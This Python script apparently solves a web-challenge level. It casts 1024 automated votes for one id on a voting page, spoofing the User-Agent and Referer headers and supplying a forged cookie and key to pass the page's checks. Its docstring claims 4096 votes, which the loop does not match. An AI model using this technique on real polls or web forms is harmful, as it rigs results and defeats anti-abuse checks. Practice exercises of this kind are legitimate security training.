#!/usr/bin/python3
"""Module to automatically vote for id 2326, 4096 times """
import requests

"""
To add HTTP headers to a request, you can simply pass them in a
dict to the headers parameter. Similarly, you can also send your own
cookies to a server using a dict passed to the cookies parameter.
"""

"""
test to get header and cookies:
def get_kookies(url):
    kookies = requests.cookies.RequestsCookieJar()
    req = requests.get(url, cookies=kookies)
    print(req.headers)
    """

url = 'http://158.69.76.135/level2.php'
UserAgt = 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'

r = requests.get(url)

"""test cookies"""
print(r.cookies)


newHeader = {'User-Agent': UserAgt, 'Referer': url}
passValues = {'id': '2326', 'holdthedoor': 'Submit', 'key': 'freshCookie'}
kookies = {'HoldTheDoor': 'freshCookie'}
for i in range(1024):
    r = requests.post(url, data=passValues, headers=newHeader, cookies=kookies)
result = r.text
print(result)

print('OVER!', r.status_code)
